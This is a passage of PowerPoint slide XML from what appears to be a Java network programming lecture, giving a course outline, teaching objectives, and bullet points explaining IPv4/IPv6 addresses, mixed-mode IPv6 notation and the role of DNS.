              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>2. DNS and Relationship with IP address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t> Class and Application Programming</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t> Object and its Security Issues</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>5. DNS Cache Configuration</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>6. Hostname/Domain Acquisition Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>7. Testing IP Address Properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>8. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> Class</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>9. Spam Detection (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>SpamCheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>10. Offline Log Processing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>11. Programming Practice &amp; Critical Thinking</a:t>
            </a:r>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1. Internet Address Concepts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="76201" y="1600200"/>
            <a:ext cx="11713634" cy="4498975"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Understand IPv4/IPv6 addressing, subnetting, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>pecial addresses (loopback, private/public).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Differentiate between logical hostnames and physical IP addresses.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can classify IP addresses and explain their use cases (e.g., 127.0.0.1 for local testing).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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546226" y="152400"/>
            <a:ext cx="7775575" cy="114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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> ( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Address)</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="76200" y="1320800"/>
            <a:ext cx="12039600" cy="5080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Aft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>ALL End System devices connected to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>the Internet ( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>including computers, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>PDAs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>, printers, and other electronic devices </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>have a unique ID, which is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>an IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>addresses on the Internet consist of 4 bytes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>this </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>type of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>address is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>There is another type of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IP address on the Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>that consists of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>16 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bytes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IPv6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>The number in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IPv6 is the version number </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>Protocol </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>( IP) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US"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019299" y="228600"/>
            <a:ext cx="8153400" cy="114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indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IPV4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IPV6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ixed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Network</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="1676400"/>
            <a:ext cx="11582399" cy="4038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Aft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>In a mixed mode </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv6 network, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the last four bytes of the IPv6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t> can be written in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>address format.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>For example, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>FEDC:BA98:7654:3210:FEDC:BA98:7654:3210 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>can be written as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>FEDC:BA98:7654:3210:FEDC:BA98:118.84.50.16 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>When a computer accessing network resources uses an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>address, the system automatically uses the last four bytes of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>the IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>address.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB"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2. DNS and IP Relationship</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Explain DNS hierarchy, forward/reverse lookups, and common record types (A, AAAA, PTR).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Demonstrate how DNS translates human-readable names to machine-friendly IPs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can perform DNS queries programmatically and analyze results (e.g., dig-like tools in Java)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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304800" y="990600"/>
            <a:ext cx="11734799" cy="5638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800" dirty="0"/>
              <a:t>Both </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>addresses and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IPv6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>addresses are difficult to remember.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>To make these addresses easier to remember, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>designers invented </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" b="1" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>links </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>an IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address to a domain name (an easy-to-remember string of characters) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>To acess Internet Resources </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>through a domain name , the system first obtains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address corresponding to the domain name through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>, and then </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>accesses the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Internet R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>esource using </a:t>
            </a:r>
